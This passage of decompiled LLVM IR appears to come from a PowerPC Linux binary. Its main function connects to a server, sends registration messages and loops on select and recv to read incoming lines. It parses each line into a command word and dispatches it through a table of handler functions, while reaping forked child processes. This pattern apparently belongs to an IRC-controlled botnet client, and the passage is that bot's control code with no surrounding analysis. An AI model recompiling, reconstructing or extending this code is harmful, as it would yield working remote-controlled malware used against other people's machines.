  %v4_10002444 = call i32 @strcpy(i32 %v2_10002438, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_1000b8ec.303, i32 0, i32 0))
  store i32 %v2_1000242c, i32* @r4, align 4
  %v2_10002454 = bitcast i32* %stack_var_-6484 to i8*
  %v3_10002454 = call i32 @strcat(i8* %v2_10002454, i32 %v2_1000242c)
  store i32 %v2_10002438, i32* @global_var_1001d844.289, align 4
  store i32 268444776, i32* @lr, align 4
  %v2_10002464 = call i32 @makestring(i32 %v3_10002454, i32 268566528)
  store i32 %v2_10002464, i32* @global_var_1001d83c.269, align 4
  store i32 268444792, i32* @lr, align 4
  %v2_10002474 = call i32 @makestring(i32 268566528, i32 %v2_1000242c)
  store i32 %v2_10002474, i32* @global_var_1001d84c.325, align 4
  store i32 ptrtoint (i32* @global_var_1000b968.326 to i32), i32* @global_var_1001d85c.277, align 4
  store i32 ptrtoint (i32* @global_var_1000b96c.327 to i32), i32* @global_var_1001d858.294, align 4
  store i32 ptrtoint (i32* @global_var_1000b96c.327 to i32), i32* @global_var_1001d840.328, align 4
  store i32 0, i32* @global_var_1001d850.309, align 4
  %v2_10002534 = ptrtoint i32* %stack_var_-6424 to i32
  %v2_1000258c = ptrtoint i32* %stack_var_-6808 to i32
  %v2_10002590 = add i32 %v2_1000258c, 384
  %v2_100025e8 = ptrtoint i32* %stack_var_-6432 to i32
  %v2_100027fc = ptrtoint i32* %stack_var_-4120 to i32
  %v2_100028e8 = ptrtoint i32* %stack_var_-5144 to i32
  %v2_10002990 = ptrtoint i32* %stack_var_-6168 to i32
  %v2_10002830 = add i32 %v2_1000258c, 2688
  br label %dec_label_pc_100024c4

dec_label_pc_100024c4:                            ; preds = %dec_label_pc_100027f4, %dec_label_pc_10002578, %dec_label_pc_10002a68, %dec_label_pc_100023f4
  store i32 268444872, i32* @lr, align 4
  %v0_100024c4 = call i32 @con()
  %v3_100024cc = load i32, i32* @global_var_1001d848.304, align 4
  %v3_100024d4 = load i32, i32* @global_var_1001d840.328, align 4
  %v6_100024ec = call i32 @Send(i32 %v3_100024cc, i32 ptrtoint ([9 x i8]* @global_var_1000b970.329 to i32), i32 %v3_100024d4, i32 268500992, i32 %v2_100025e8)
  %v3_100024f4 = load i32, i32* @global_var_1001d848.304, align 4
  %v3_100024fc = load i32, i32* @global_var_1001d844.289, align 4
  %v3_10002504 = load i32, i32* @global_var_1001d83c.269, align 4
  %v3_1000250c = load i32, i32* @global_var_1001d84c.325, align 4
  %v7_1000252c = call i32 @Send(i32 %v3_100024f4, i32 ptrtoint ([41 x i8]* @global_var_1000b97c.330 to i32), i32 %v3_100024fc, i32 %v3_10002504, i32 %v3_1000250c)
  br label %dec_label_pc_10002534

dec_label_pc_10002534:                            ; preds = %dec_label_pc_100027b4, %dec_label_pc_10002828, %dec_label_pc_10002a88, %dec_label_pc_10002aac, %dec_label_pc_100024c4
  br label %dec_label_pc_10002548

dec_label_pc_10002548:                            ; preds = %dec_label_pc_10002534, %dec_label_pc_10002548
  %storemerge1428 = phi i32 [ 0, %dec_label_pc_10002534 ], [ %v1_10002564, %dec_label_pc_10002548 ]
  %v1_10002550 = mul nuw nsw i32 %storemerge1428, 4
  %v2_10002554 = add i32 %v1_10002550, %v2_10002534
  %v2_1000255c = inttoptr i32 %v2_10002554 to i32*
  store i32 0, i32* %v2_1000255c, align 4
  %v1_10002564 = add nuw nsw i32 %storemerge1428, 1
  %tmp88 = icmp ult i32 %v1_10002564, 32
  br i1 %tmp88, label %dec_label_pc_10002548, label %dec_label_pc_10002578

dec_label_pc_10002578:                            ; preds = %dec_label_pc_10002548
  %v3_1000257c = load i32, i32* @global_var_1001d848.304, align 4
  %v1_10002580 = udiv i32 %v3_1000257c, 32
  %v1_10002588 = mul nuw nsw i32 %v1_10002580, 4
  %v1_10002594 = add i32 %v1_10002588, %v2_10002590
  %v1_10002598 = inttoptr i32 %v1_10002594 to i32*
  %v2_10002598 = load i32, i32* %v1_10002598, align 4
  %v1_100025a4 = urem i32 %v3_1000257c, 32
  %v3_100025ac = shl i32 1, %v1_100025a4
  %v2_100025b0 = or i32 %v2_10002598, %v3_100025ac
  store i32 %v2_100025b0, i32* %v1_10002598, align 4
  store i32 1200, i32* %stack_var_-6432, align 4
  %v3_100025dc = load i32, i32* @global_var_1001d848.304, align 4
  %v1_100025e0 = add i32 %v3_100025dc, 1
  store i32 268445188, i32* @lr, align 4
  %v6_10002600 = call i32 @__libc_select(i32 %v1_100025e0, i32 %v2_10002534, i32 0, i32 0, i32 %v2_100025e8, i32 %v2_10002534)
  %tmp89 = icmp slt i32 %v6_10002600, 1
  br i1 %tmp89, label %dec_label_pc_100024c4, label %dec_label_pc_100027a0.preheader

dec_label_pc_100027a0.preheader:                  ; preds = %dec_label_pc_10002578
  %v3_100027a433 = load i32, i32* @global_var_1001d834.265, align 4
  %v2_100027ac34 = icmp eq i32 %v3_100027a433, 0
  br i1 %v2_100027ac34, label %dec_label_pc_100027b4, label %dec_label_pc_1000261c

dec_label_pc_1000261c:                            ; preds = %dec_label_pc_100027a0.preheader, %dec_label_pc_10002794
  %storemerge1536 = phi i32 [ %.pre, %dec_label_pc_10002794 ], [ 0, %dec_label_pc_100027a0.preheader ]
  %v1_10002620 = mul i32 %storemerge1536, 4
  %v3_1000262c = load i32, i32* @global_var_1001d860.266, align 4
  %v2_10002630 = add i32 %v3_1000262c, %v1_10002620
  %v1_10002634 = inttoptr i32 %v2_10002630 to i32*
  %v2_10002634 = load i32, i32* %v1_10002634, align 4
  store i32 268445256, i32* @lr, align 4
  %v4_10002644 = call i32 @__libc_waitpid(i32 %v2_10002634, i32 0, i32 1, i32 %v2_10002630)
  %tmp90 = icmp slt i32 %v4_10002644, 1
  %.pre = add i32 %storemerge1536, 1
  br i1 %tmp90, label %dec_label_pc_10002794, label %dec_label_pc_100026ac.preheader

dec_label_pc_100026ac.preheader:                  ; preds = %dec_label_pc_1000261c
  %v3_100026b094 = load i32, i32* @global_var_1001d834.265, align 4
  %v2_100026b895 = icmp ult i32 %.pre, %v3_100026b094
  %v1_1000266896 = mul i32 %.pre, 4
  %v3_1000267497 = load i32, i32* @global_var_1001d860.266, align 4
  %v2_1000267898 = add i32 %v3_1000267497, %v1_1000266896
  br i1 %v2_100026b895, label %dec_label_pc_10002664, label %dec_label_pc_100026c0

dec_label_pc_10002664:                            ; preds = %dec_label_pc_100026ac.preheader, %dec_label_pc_10002664
  %v2_10002678102 = phi i32 [ %v2_10002678, %dec_label_pc_10002664 ], [ %v2_1000267898, %dec_label_pc_100026ac.preheader ]
  %v1_1000265899 = phi i32 [ %v1_10002658, %dec_label_pc_10002664 ], [ %.pre, %dec_label_pc_100026ac.preheader ]
  %v1_1000267c = add i32 %v2_10002678102, -4
  %v1_10002698 = inttoptr i32 %v2_10002678102 to i32*
  %v2_10002698 = load i32, i32* %v1_10002698, align 4
  %v2_1000269c = inttoptr i32 %v1_1000267c to i32*
  store i32 %v2_10002698, i32* %v2_1000269c, align 4
  %v1_10002658 = add i32 %v1_1000265899, 1
  %v3_100026b0 = load i32, i32* @global_var_1001d834.265, align 4
  %v2_100026b8 = icmp ult i32 %v1_10002658, %v3_100026b0
  %v1_10002668 = mul i32 %v1_10002658, 4
  %v3_10002674 = load i32, i32* @global_var_1001d860.266, align 4
  %v2_10002678 = add i32 %v3_10002674, %v1_10002668
  br i1 %v2_100026b8, label %dec_label_pc_10002664, label %dec_label_pc_100026c0

dec_label_pc_100026c0:                            ; preds = %dec_label_pc_10002664, %dec_label_pc_100026ac.preheader
  %v2_10002678.lcssa = phi i32 [ %v2_1000267898, %dec_label_pc_100026ac.preheader ], [ %v2_10002678, %dec_label_pc_10002664 ]
  %v1_100026d8 = add i32 %v2_10002678.lcssa, -4
  %v2_100026e0 = inttoptr i32 %v1_100026d8 to i32*
  store i32 0, i32* %v2_100026e0, align 4
  %v3_100026e8 = load i32, i32* @global_var_1001d834.265, align 4
  %v1_100026ec = add i32 %v3_100026e8, -1
  store i32 %v1_100026ec, i32* @global_var_1001d834.265, align 4
  %v1_10002700 = mul i32 %v1_100026ec, 4
  %v1_10002704 = add i32 %v1_10002700, 4
  store i32 %v1_10002704, i32* @r3, align 4
  store i32 268445456, i32* @lr, align 4
  %v0_1000270c = call i32 @malloc()
  %v3_1000276829 = load i32, i32* @global_var_1001d834.265, align 4
  %v2_1000277030 = icmp eq i32 %v3_1000276829, 0
  br i1 %v2_1000277030, label %dec_label_pc_10002778, label %dec_label_pc_10002724

dec_label_pc_10002724:                            ; preds = %dec_label_pc_100026c0, %dec_label_pc_10002724
  %storemerge2232 = phi i32 [ %v1_1000275c, %dec_label_pc_10002724 ], [ 0, %dec_label_pc_100026c0 ]
  %v1_10002728 = mul i32 %storemerge2232, 4
  %v2_10002734 = add i32 %v1_10002728, %v0_1000270c
  %v3_10002748 = load i32, i32* @global_var_1001d860.266, align 4
  %v2_1000274c = add i32 %v3_10002748, %v1_10002728
  %v1_10002750 = inttoptr i32 %v2_1000274c to i32*
  %v2_10002750 = load i32, i32* %v1_10002750, align 4
  %v2_10002754 = inttoptr i32 %v2_10002734 to i32*
  store i32 %v2_10002750, i32* %v2_10002754, align 4
  %v1_1000275c = add i32 %storemerge2232, 1
  %v3_10002768 = load i32, i32* @global_var_1001d834.265, align 4
  %v2_10002770 = icmp ult i32 %v1_1000275c, %v3_10002768
  br i1 %v2_10002770, label %dec_label_pc_10002724, label %dec_label_pc_10002764.dec_label_pc_10002778_crit_edge

dec_label_pc_10002764.dec_label_pc_10002778_crit_edge: ; preds = %dec_label_pc_10002724
  br label %dec_label_pc_10002778

dec_label_pc_10002778:                            ; preds = %dec_label_pc_100026c0, %dec_label_pc_10002764.dec_label_pc_10002778_crit_edge
  %v3_1000277c = load i32, i32* @global_var_1001d860.266, align 4
  store i32 %v3_1000277c, i32* @r3, align 4
  store i32 268445576, i32* @lr, align 4
  %v0_10002784 = call i32 @free()
  store i32 %v0_1000270c, i32* @global_var_1001d860.266, align 4
  br label %dec_label_pc_10002794

dec_label_pc_10002794:                            ; preds = %dec_label_pc_1000261c, %dec_label_pc_10002778
  %v3_100027a4 = load i32, i32* @global_var_1001d834.265, align 4
  %v2_100027ac = icmp ult i32 %.pre, %v3_100027a4
  br i1 %v2_100027ac, label %dec_label_pc_1000261c, label %dec_label_pc_100027b4

dec_label_pc_100027b4:                            ; preds = %dec_label_pc_100027a0.preheader, %dec_label_pc_10002794
  %v3_100027b8 = load i32, i32* @global_var_1001d848.304, align 4
  %v1_100027bc = udiv i32 %v3_100027b8, 32
  %v1_100027c0 = mul nuw nsw i32 %v1_100027bc, 4
  %v1_100027cc = add i32 %v1_100027c0, %v2_10002590
  %v1_100027d0 = inttoptr i32 %v1_100027cc to i32*
  %v2_100027d0 = load i32, i32* %v1_100027d0, align 4
  %v1_100027dc = urem i32 %v3_100027b8, 32
  %v3_100027e0 = sub i32 0, %v3_100027b8
  %v4_100027e0 = urem i32 %v3_100027e0, 32
  %v5_100027e0 = shl i32 %v2_100027d0, %v4_100027e0
  %v6_100027e0 = xor i32 %v4_100027e0, 31
  %v7_100027e0 = lshr i32 %v2_100027d0, %v6_100027e0
  %v8_100027e0 = udiv i32 %v7_100027e0, 2
  %v9_100027e0 = or i32 %v8_100027e0, %v5_100027e0
  %v12_100027e0 = lshr i32 -1, %v1_100027dc
  %tmp125 = icmp slt i32 %v2_100027d0, 0
  %v15_100027e023 = zext i1 %tmp125 to i32
  %v16_100027e0 = xor i32 %v12_100027e0, 1
  %v17_100027e0 = and i32 %v15_100027e023, %v16_100027e0
  %v14_100027e0 = urem i32 %v12_100027e0, 2
  %v14_100027e0.masked = and i32 %v14_100027e0, %v9_100027e0
  %v1_100027e8 = or i32 %v14_100027e0.masked, %v17_100027e0
  %v3_100027ec = icmp eq i32 %v1_100027e8, 0
  br i1 %v3_100027ec, label %dec_label_pc_10002534, label %dec_label_pc_100027f4

dec_label_pc_100027f4:                            ; preds = %dec_label_pc_100027b4
  store i32 268445716, i32* @lr, align 4
  %v4_10002810 = call i32 @__libc_recv(i32 %v3_100027b8, i32 %v2_100027fc, i32 4096, i32 0)
  store i32 %v4_10002810, i32* %stack_var_-6808, align 4
  %tmp91 = icmp slt i32 %v4_10002810, 1
  br i1 %tmp91, label %dec_label_pc_100024c4, label %dec_label_pc_10002828

dec_label_pc_10002828:                            ; preds = %dec_label_pc_100027f4
  %v3_10002838 = add i32 %v2_10002830, %v4_10002810
  %v4_10002838 = inttoptr i32 %v3_10002838 to i8*
  store i8 0, i8* %v4_10002838, align 1
  store i32 ptrtoint (i32* @global_var_1000b9a8.332 to i32), i32* @r4, align 4
  store i32 268445776, i32* @lr, align 4
  %v3_1000284c = call i32 @__GI_strtok(i32 %v2_100027fc, i32 ptrtoint (i32* @global_var_1000b9a8.332 to i32), i32 268500992)
  %v3_10002aa450 = icmp eq i32 %v3_1000284c, 0
  br i1 %v3_10002aa450, label %dec_label_pc_10002534, label %dec_label_pc_10002aac

dec_label_pc_1000285c:                            ; preds = %dec_label_pc_10002aac
  store i32 268445796, i32* @lr, align 4
  %v2_10002860 = call i32 @filter(i32 %storemerge52.in)
  %v2_10002868 = load i8, i8* %storemerge52, align 1
  %v3_10002870 = icmp eq i8 %v2_10002868, 58
  br i1 %v3_10002870, label %dec_label_pc_10002890.preheader, label %dec_label_pc_1000291c

dec_label_pc_10002890.preheader:                  ; preds = %dec_label_pc_1000285c
  store i32 0, i32* %stack_var_-6808, align 4
  store i32 %storemerge52.in, i32* @r3, align 4
  %v0_1000289837 = call i32 @__GI_strlen()
  %v2_100028a039 = icmp eq i32 %v0_1000289837, 0
  br i1 %v2_100028a039, label %dec_label_pc_100028c8, label %dec_label_pc_100028a8

dec_label_pc_10002884:                            ; preds = %dec_label_pc_100028a8
  %v1_10002888 = add i32 %v3_100028a8, 1
  store i32 %v1_10002888, i32* %stack_var_-6808, align 4
  store i32 %storemerge52.in, i32* @r3, align 4
  %v0_10002898 = call i32 @__GI_strlen()
  %v2_100028a0 = icmp ult i32 %v1_10002888, %v0_10002898
  br i1 %v2_100028a0, label %dec_label_pc_100028a8, label %dec_label_pc_100028c8

dec_label_pc_100028a8:                            ; preds = %dec_label_pc_10002890.preheader, %dec_label_pc_10002884
  %v3_100028a8 = load i32, i32* %stack_var_-6808, align 4
  %v2_100028b4 = add i32 %v3_100028a8, %storemerge52.in
  %v1_100028b8 = inttoptr i32 %v2_100028b4 to i8*
  %v2_100028b8 = load i8, i8* %v1_100028b8, align 1
  %v3_100028c0 = icmp eq i8 %v2_100028b8, 32
  br i1 %v3_100028c0, label %dec_label_pc_100028c8, label %dec_label_pc_10002884

dec_label_pc_100028c8:                            ; preds = %dec_label_pc_10002890.preheader, %dec_label_pc_10002884, %dec_label_pc_100028a8
  %v3_100028c8 = load i32, i32* %stack_var_-6808, align 4
  %v2_100028d4 = add i32 %v3_100028c8, %storemerge52.in
  %v3_100028dc = inttoptr i32 %v2_100028d4 to i8*
  store i8 0, i8* %v3_100028dc, align 1
  %v1_100028e4 = add i32 %storemerge52.in, 1
  %v2_100028f4 = inttoptr i32 %v1_100028e4 to i8*
  %v3_100028f4 = call i32 @strcpy(i32 %v2_100028e8, i8* %v2_100028f4)
  %v3_100028f8 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002904 = add i32 %v3_100028f8, %storemerge52.in
  %v1_10002908 = add i32 %v2_10002904, 1
  %v3_10002914 = inttoptr i32 %v1_10002908 to i8*
  %v4_10002914 = call i32 @strcpy(i32 %storemerge52.in, i8* %v3_10002914)
  br label %dec_label_pc_10002940.preheader

dec_label_pc_1000291c:                            ; preds = %dec_label_pc_1000285c
  store i32 10752, i32* %stack_var_-5144, align 4
  br label %dec_label_pc_10002940.preheader

dec_label_pc_10002940.preheader:                  ; preds = %dec_label_pc_100028c8, %dec_label_pc_1000291c
  store i32 0, i32* %stack_var_-6808, align 4
  store i32 %storemerge52.in, i32* @r3, align 4
  %v0_1000294842 = call i32 @__GI_strlen()
  %v2_1000295044 = icmp eq i32 %v0_1000294842, 0
  br i1 %v2_1000295044, label %dec_label_pc_10002978, label %dec_label_pc_10002958

dec_label_pc_10002934:                            ; preds = %dec_label_pc_10002958
  %v1_10002938 = add i32 %v3_10002958, 1
  store i32 %v1_10002938, i32* %stack_var_-6808, align 4
  store i32 %storemerge52.in, i32* @r3, align 4
  %v0_10002948 = call i32 @__GI_strlen()
  %v2_10002950 = icmp ult i32 %v1_10002938, %v0_10002948
  br i1 %v2_10002950, label %dec_label_pc_10002958, label %dec_label_pc_10002978

dec_label_pc_10002958:                            ; preds = %dec_label_pc_10002940.preheader, %dec_label_pc_10002934
  %v3_10002958 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002964 = add i32 %v3_10002958, %storemerge52.in
  %v1_10002968 = inttoptr i32 %v2_10002964 to i8*
  %v2_10002968 = load i8, i8* %v1_10002968, align 1
  %v3_10002970 = icmp eq i8 %v2_10002968, 32
  br i1 %v3_10002970, label %dec_label_pc_10002978, label %dec_label_pc_10002934

dec_label_pc_10002978:                            ; preds = %dec_label_pc_10002940.preheader, %dec_label_pc_10002934, %dec_label_pc_10002958
  %v3_10002978 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002984 = add i32 %v3_10002978, %storemerge52.in
  %v3_1000298c = inttoptr i32 %v2_10002984 to i8*
  store i8 0, i8* %v3_1000298c, align 1
  %v4_1000299c = call i32 @strcpy(i32 %v2_10002990, i8* %storemerge52)
  %v3_100029a0 = load i32, i32* %stack_var_-6808, align 4
  %v2_100029ac = add i32 %v3_100029a0, %storemerge52.in
  %v1_100029b0 = add i32 %v2_100029ac, 1
  %v3_100029bc = inttoptr i32 %v1_100029b0 to i8*
  %v4_100029bc = call i32 @strcpy(i32 %storemerge52.in, i8* %v3_100029bc)
  store i32 0, i32* %stack_var_-6808, align 4
  %v2_10002a5c105 = load i32, i32* bitcast ([4 x i8]** @global_var_1001d474.336 to i32*), align 4
  %v3_10002a60108 = icmp eq i32 %v2_10002a5c105, 0
  br i1 %v3_10002a60108, label %dec_label_pc_10002a68, label %dec_label_pc_100029cc

dec_label_pc_100029cc:                            ; preds = %dec_label_pc_10002978, %dec_label_pc_100029cc
  %v1_10002a5c111 = phi i32* [ %v1_10002a5c, %dec_label_pc_100029cc ], [ bitcast ([4 x i8]** @global_var_1001d474.336 to i32*), %dec_label_pc_10002978 ]
  %v2_100029e0 = load i32, i32* %v1_10002a5c111, align 4
  store i32 %v2_100029e0, i32* @r3, align 4
  store i32 %v2_10002990, i32* @r4, align 4
  %v2_100029f0 = call i32 @__GI_strcasecmp(i32 %v2_100029e0, i32 %v2_10002990)
  %v3_10002a00 = load i32, i32* %stack_var_-6808, align 4
  %v1_10002a0c = mul i32 %v3_10002a00, 8
  %v1_10002a14 = add i32 %v1_10002a0c, add (i32 ptrtoint ([4 x i8]** @global_var_1001d474.336 to i32), i32 4)
  %v1_10002a18 = inttoptr i32 %v1_10002a14 to i32*
  %v2_10002a18 = load i32, i32* %v1_10002a18, align 4
  call void @__pseudo_call(i32 %v2_10002a18)
  %v3_10002a3c = load i32, i32* %stack_var_-6808, align 4
  %v1_10002a40 = add i32 %v3_10002a3c, 1
  store i32 %v1_10002a40, i32* %stack_var_-6808, align 4
  %v1_10002a54 = mul i32 %v1_10002a40, 8
  %v2_10002a58 = add i32 %v1_10002a54, ptrtoint ([4 x i8]** @global_var_1001d474.336 to i32)
  %v1_10002a5c = inttoptr i32 %v2_10002a58 to i32*
  %v2_10002a5c = load i32, i32* %v1_10002a5c, align 4
  %v3_10002a60 = icmp eq i32 %v2_10002a5c, 0
  br i1 %v3_10002a60, label %dec_label_pc_10002a68, label %dec_label_pc_100029cc

dec_label_pc_10002a68:                            ; preds = %dec_label_pc_100029cc, %dec_label_pc_10002978
  store i32 %v2_10002990, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000b9ac.337 to i32), i32* @r4, align 4
  %v3_10002a78 = call i32 @__GI_strcasecmp(i32 %v2_10002990, i32 ptrtoint ([6 x i8]* @global_var_1000b9ac.337 to i32))
  %v3_10002a80 = icmp eq i32 %v3_10002a78, 0
  br i1 %v3_10002a80, label %dec_label_pc_100024c4, label %dec_label_pc_10002a88

dec_label_pc_10002a88:                            ; preds = %dec_label_pc_10002a68
  store i32 ptrtoint (i32* @global_var_1000b9a8.332 to i32), i32* @r4, align 4
  store i32 268446360, i32* @lr, align 4
  %v3_10002a94 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1000b9a8.332 to i32), i32 268500992)
  %v3_10002aa4 = icmp eq i32 %v3_10002a94, 0
  br i1 %v3_10002aa4, label %dec_label_pc_10002534, label %dec_label_pc_10002aac

dec_label_pc_10002aac:                            ; preds = %dec_label_pc_10002828, %dec_label_pc_10002a88
  %storemerge52.in = phi i32 [ %v3_10002a94, %dec_label_pc_10002a88 ], [ %v3_1000284c, %dec_label_pc_10002828 ]
  %storemerge52 = inttoptr i32 %storemerge52.in to i8*
  %v2_10002ab0 = load i8, i8* %storemerge52, align 1
  %v3_10002ab8 = icmp eq i8 %v2_10002ab0, 0
  br i1 %v3_10002ab8, label %dec_label_pc_10002534, label %dec_label_pc_1000285c

; uselistorder directives
  uselistorder i8* %storemerge52, { 2, 1, 0 }
  uselistorder i32 %storemerge52.in, { 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10002a5c, { 1, 0 }
  uselistorder i32 %v4_100027e0, { 1, 0 }
  uselistorder i32 %v2_100027d0, { 0, 2, 1 }
  uselistorder i32 %v3_100027b8, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000275c, { 1, 0 }
  uselistorder i32 %v1_10002728, { 1, 0 }
  uselistorder i32 %storemerge2232, { 1, 0 }
  uselistorder i32 %v0_1000270c, { 1, 0 }
  uselistorder i32 %v1_10002658, { 0, 2, 1 }
  uselistorder i32 %v2_10002678102, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1536, { 1, 0 }
  uselistorder i32 %v3_1000257c, { 1, 0 }
  uselistorder i32 %storemerge1428, { 1, 0 }
  uselistorder i32 %v2_10002990, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_100025e8, { 1, 0 }
  uselistorder i32 %v2_10002534, { 2, 1, 0 }
  uselistorder i32 %v2_1000242c, { 2, 1, 0 }
  uselistorder i32 %v1_100023dc, { 1, 0 }
  uselistorder i32 %v2_1000239c, { 1, 0 }
  uselistorder i32 %storemerge1356, { 1, 0 }
  uselistorder i32 %v3_100022ec, { 1, 0, 2 }
  uselistorder i32 %v2_10002278, { 1, 0, 2 }
  uselistorder i32 %v2_10002250, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10002218, { 0, 2, 1 }
  uselistorder i32 %stack_var_-6756.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_10002158, { 4, 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-6808, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_1001d474.336 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_1001d474.336, { 1, 0 }
  uselistorder i32 (i32)* @filter, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000b9a8.332 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_1001d860.266, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* @global_var_1001d834.265, { 5, 6, 2, 7, 8, 9, 0, 1, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32 (i32, i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 7, 6, 0, 5, 2, 1, 4, 3 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 0 }
  uselistorder i8 47, { 1, 0 }
  uselistorder i32 %argc, { 1, 0 }
  uselistorder label %dec_label_pc_10002aac, { 1, 0 }
  uselistorder label %dec_label_pc_100029cc, { 1, 0 }
  uselistorder label %dec_label_pc_10002978, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002958, { 1, 0 }
  uselistorder label %dec_label_pc_10002940.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100028c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100028a8, { 1, 0 }
  uselistorder label %dec_label_pc_100027b4, { 1, 0 }
  uselistorder label %dec_label_pc_10002794, { 1, 0 }
  uselistorder label %dec_label_pc_10002778, { 1, 0 }
  uselistorder label %dec_label_pc_10002724, { 1, 0 }
  uselistorder label %dec_label_pc_10002664, { 1, 0 }
  uselistorder label %dec_label_pc_1000261c, { 1, 0 }
  uselistorder label %dec_label_pc_10002548, { 1, 0 }
  uselistorder label %dec_label_pc_10002534, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_100024c4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10002388, { 1, 0 }
  uselistorder label %dec_label_pc_1000234c, { 1, 0 }
  uselistorder label %dec_label_pc_10002334, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10002214, { 1, 0 }
  uselistorder label %dec_label_pc_100021b4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_10002ae8 = icmp eq i32 %arg2, -2143521772
  %v2_10002aec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10002aec, i32* %stack_var_-32, align 4
  br i1 %v4_10002ae8, label %dec_label_pc_10002b48, label %dec_label_pc_10002b08

dec_label_pc_10002b08:                            ; preds = %entry
  %v3_10002b08 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_10002b08, label %dec_label_pc_10002b20, label %dec_label_pc_10002b10

dec_label_pc_10002b10:                            ; preds = %dec_label_pc_10002b08
  %v3_10002b14 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10002b14, label %dec_label_pc_10002b3c, label %dec_label_pc_10002b68

dec_label_pc_10002b20:                            ; preds = %dec_label_pc_10002b08
  %v1_10002b20 = xor i32 %arg2, -2143551488
  %v3_10002b24 = icmp eq i32 %v1_10002b20, 29717
  br i1 %v3_10002b24, label %dec_label_pc_10002b58, label %dec_label_pc_10002b2c

dec_label_pc_10002b2c:                            ; preds = %dec_label_pc_10002b20
  %v3_10002b30 = icmp eq i32 %v1_10002b20, 29718
  br i1 %v3_10002b30, label %dec_label_pc_10002b60, label %dec_label_pc_10002b68

dec_label_pc_10002b3c:                            ; preds = %dec_label_pc_10002b10
  store i32 ptrtoint (i32* @global_var_10002b44.338 to i32), i32* @lr, align 4
  %v1_10002b40 = inttoptr i32 %arg3 to i32*
  %v2_10002b40 = call i32 @__GI_tcgetattr(i32* %v1_10002b40)
  br label %dec_label_pc_10002b50

dec_label_pc_10002b48:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10002b4c

dec_label_pc_10002b4c:                            ; preds = %dec_label_pc_10002b60, %dec_label_pc_10002b58, %dec_label_pc_10002b48
  store i32 268446544, i32* @lr, align 4
  %v0_10002b4c = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_10002b50

dec_label_pc_10002b50:                            ; preds = %dec_label_pc_10002b3c, %dec_label_pc_10002b4c
  %storemerge = phi i32 [ %v0_10002b4c, %dec_label_pc_10002b4c ], [ %v2_10002b40, %dec_label_pc_10002b3c ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002b94

dec_label_pc_10002b58:                            ; preds = %dec_label_pc_10002b20
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10002b4c

dec_label_pc_10002b60:                            ; preds = %dec_label_pc_10002b2c
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10002b4c

dec_label_pc_10002b68:                            ; preds = %dec_label_pc_10002b2c, %dec_label_pc_10002b10
  %v0_10002b78 = call i32 @__asm_mfcr()
  %v1_10002b7c = and i32 %v0_10002b78, 268435456
  %v3_10002b7c = icmp eq i32 %v1_10002b7c, 0
  store i32 %v0_10002b78, i32* %r31.global-to-local, align 4
  br i1 %v3_10002b7c, label %dec_label_pc_10002b94, label %dec_label_pc_10002b88

dec_label_pc_10002b88:                            ; preds = %dec_label_pc_10002b68
  %v0_10002b88 = call i32 @__errno_location()
  %v0_10002b8c = load i32, i32* %r31.global-to-local, align 4
  %v2_10002b8c = inttoptr i32 %v0_10002b88 to i32*
  store i32 %v0_10002b8c, i32* %v2_10002b8c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002b94

dec_label_pc_10002b94:                            ; preds = %dec_label_pc_10002b68, %dec_label_pc_10002b50, %dec_label_pc_10002b88
  %v0_10002b98 = phi i32 [ %v0_10002b78, %dec_label_pc_10002b68 ], [ %storemerge, %dec_label_pc_10002b50 ], [ -1, %dec_label_pc_10002b88 ]
  ret i32 %v0_10002b98

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10002b94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10002b50, { 1, 0 }
}

